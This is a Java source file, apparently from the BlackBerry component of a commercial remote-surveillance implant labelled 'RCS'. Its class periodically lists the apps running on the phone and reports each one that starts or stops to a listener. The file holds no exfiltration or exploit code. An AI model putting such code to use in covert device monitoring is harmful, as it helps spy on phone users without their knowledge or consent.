//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : AppUpdateManager.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry;

import java.util.Enumeration;
import java.util.Hashtable;
import java.util.TimerTask;
import java.util.Vector;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class AppUpdateManager.
 */
public final class AppUpdateManager extends TimerTask {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppManager", DebugLevel.VERBOSE);
    //#endif
    ApplicationManager manager = ApplicationManager.getApplicationManager();
    Hashtable appSet = new Hashtable();
    AppListener appListener = AppListener.getInstance();

    boolean running;

    boolean windowName = false;

    public AppUpdateManager() {

    }

    public AppUpdateManager(AppUpdateManager appManager) {
        appSet = appManager.appSet;
    }

    public boolean isRunning(){
        return running;
    }
    
    /*
     * (non-Javadoc)
     * @see java.util.TimerTask#run()
     */
    public void run() {
        synchronized (this) {
            if (running) {
                return;
            } else {
                running = true;
            }
        }

        try {
            final Hashtable newSet = new Hashtable();
            final Vector startedListName = new Vector();
            final Vector stoppedListName = new Vector();
            final Vector startedListMod = new Vector();
            final Vector stoppedListMod = new Vector();

            // Hashtable changes = new Hashtable();
            boolean haveChanges = false;

            // Check to see if application is running.
            final ApplicationDescriptor[] descriptors = manager
                    .getVisibleApplications();

            //#ifdef DEBUG_TRACE
            //debug.trace("running: "+ descriptors.length);

            //#endif

            // Retrieve the name of a running application.
            for (int i = 0; i < descriptors.length; i++) {
                final ApplicationDescriptor descriptor = descriptors[i];

                newSet.put(descriptor, "");

                if (appSet.containsKey(descriptor)) {
                    // tolgo gli elementi gia' presenti.
                    appSet.remove(descriptor);
                } else {
                    //#ifdef DEBUG_TRACE
                    debug.trace("Started: " + descriptor.getName());
                    //#endif
                    startedListName.addElement(descriptor.getName());
                    startedListMod.addElement(descriptor.getModuleName());
                    haveChanges = true;
                }
            }

            // appList contiene gli elementi stoppati
            final Enumeration stopped = appSet.keys();
            while (stopped.hasMoreElements()) {
                final ApplicationDescriptor descriptor = (ApplicationDescriptor) stopped
                        .nextElement();
                stoppedListName.addElement(descriptor.getName());
                stoppedListMod.addElement(descriptor.getModuleName());
                //#ifdef DEBUG
                final String appName = descriptor.getName();
                debug.trace("Stopped: " + appName);
                //#endif
            }

            appSet = newSet;

            if (!stoppedListName.isEmpty()) {
                //#ifdef DBC
                Check.asserts(stoppedListName.size() == stoppedListMod.size(),
                        "different stoppedList size");
                //#endif
                haveChanges = true;
            }

            if (haveChanges) {
                //#ifdef DEBUG_TRACE
                debug.trace("haveChanges");
                //#endif

                appListener.applicationListChange(startedListName,
                        stoppedListName, startedListMod, stoppedListMod);
                appSet = newSet;
            }
        } finally {
            synchronized (this) {
                running = false;
            }
        }
    }

}
